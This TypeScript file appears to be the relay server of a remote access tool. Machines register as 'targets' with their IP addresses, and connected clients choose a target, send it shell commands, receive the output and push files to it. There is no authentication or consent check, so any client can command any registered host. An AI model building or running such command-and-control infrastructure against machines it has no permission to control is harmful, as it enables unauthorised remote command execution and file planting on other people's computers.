import * as net from "net"
import * as uuid from "uuid"
import * as fs from "fs"
import { tcpDataType } from "../types/tcpDataType"
import { createSendData } from "../functions/createSendData"
const server = net.createServer()
const PORT = 3000

interface targetType{
    id:string,
    localIP:string,
    globalIP:string,
    sendSys?:any
}
interface clientType{
    id:string,
    conTarget:string
    sendSys?:any
}

let targetList:targetType[] =[]
let publickTargetList:targetType[] = []
let clientList:clientType[] = []

server.on("connection",(socket)=>{
    console.log("connected")
    let id:string = ""
    let nowFileName:string = ""
    let nowFilePath:string = ""
    let startUL:boolean = false
    let firstUL:boolean = true
    let nowFileSize:number = 0
    let nowFileMaxSize:number = 0
    let targetID:string = ""
    socket.on("data",async(data:string)=>{
        if(!startUL){
            const getData:tcpDataType = JSON.parse(data)
            if(getData.type === "first-target"){
                console.log(getData.data)
                if(!targetList.includes(getData.data[0])){
                    const listData:targetType ={
                        id:uuid.v4(),
                        localIP:getData.data[0].localIP,
                        globalIP:getData.data[0].globalIP,
                        sendSys:socket
                    }
                    targetList.push({
                        id:listData.id,
                        localIP:listData.localIP,
                        globalIP:listData.globalIP,
                        sendSys:listData.sendSys
                    })
                    publickTargetList.push({
                        id:listData.id,
                        localIP:listData.localIP,
                        globalIP:listData.globalIP,
                    })
                    id = listData.id
                    const sendData = JSON.stringify(createSendData("sendIP",[id]))
                    socket.write(sendData)
                    console.log(publickTargetList)
                }
            }else if(getData.type === "first-client"){
                const listData:clientType = {
                    id:uuid.v4(),
                    conTarget:"",
                    sendSys:socket
                }
                id = listData.id
                clientList.push(listData)
                const sendData = JSON.stringify(createSendData("targetList",[publickTargetList]))
                socket.write(sendData)
            }else if(getData.type === "select-target"){
                console.log(getData.data[0])
                const clientIndex = clientList.findIndex(elem=>elem.id ===id)
                clientList[clientIndex].conTarget = getData.data[0]
                const targetIndex = publickTargetList.findIndex(elem=>elem.id === getData.data[0])
                const sendData = JSON.stringify(createSendData("connectedInfo",[publickTargetList[targetIndex]]))
                socket.write(sendData)
                console.log(clientList)

            }else if(getData.type === "sendCmdText"){
                const clientIndex:number = clientList.findIndex(elem=>elem.id === id)
                const targetIP:string = clientList[clientIndex].conTarget
                const targetIndex:number = publickTargetList.findIndex(elem=>elem.id === targetIP)
                const sendData = JSON.stringify(createSendData("sendCmd",[getData.data[0],id]))
                targetList[targetIndex].sendSys.write(sendData)
            }else if(getData.type === "cmdResoult"){
                const sendData = JSON.stringify(createSendData("cmdResoultClient",[getData.data[1]]))
                const clientIndex:number = clientList.findIndex(elem=>elem.id === getData.data[0])
                clientList[clientIndex].sendSys.write(sendData)
            }else if(getData.type === "sendFileName"){
                nowFileName = getData.data[0]
                nowFileMaxSize = getData.data[1]
                nowFilePath = getData.data[2]
                startUL = true
                firstUL = true
                const clientIndex:number = clientList.findIndex(elem=>elem.id === id)
                const targetIndex:number = targetList.findIndex(elem=>elem.id == clientList[clientIndex].conTarget)
                const sendData = JSON.stringify(createSendData("startUpload",[nowFileName,nowFileMaxSize,nowFilePath,getData.data[3]]))
                targetID = targetList[targetIndex].id
                targetList[targetIndex].sendSys.write(sendData)
            }
        }else{
            const targetIndex:number = targetList.findIndex(elem=>elem.id === targetID)
            const fileType:string = nowFileName.split(".")[1]
            if(firstUL){
                fs.writeFile(`./upload/upload.${fileType}`,data,(error)=>{
                    firstUL = false
                    nowFileSize = fs.statSync(`./upload/upload.${fileType}`).size
                    if(nowFileMaxSize<=nowFileSize){
                        console.log("done1")
                    }
                })
            }else{
                fs.appendFile(`./upload/upload.${fileType}`,data,(error)=>{
                    nowFileSize = fs.statSync(`./upload/upload.${fileType}`).size
                    if(nowFileMaxSize<=nowFileSize){
                        console.log("done2")
                    }
                })
            }
            // targetList[targetIndex].sendSys.write(data)
        }
    })
    socket.on("close",()=>{
        const deleteIndexTarget = publickTargetList.findIndex(elem=>elem.id === id)
        const deleteIndexClient = clientList.findIndex(elem=>elem.id === id)
        if(deleteIndexTarget != -1){
            targetList.splice(deleteIndexTarget,1)
            publickTargetList.splice(deleteIndexTarget,1)
        }
        if(deleteIndexClient != -1){
            clientList.splice(deleteIndexClient,1)
            console.log(clientList)
        }

    })
    socket.on("error",(error)=>{
    })
})

server.listen(PORT,()=>{
    console.log("server run")
})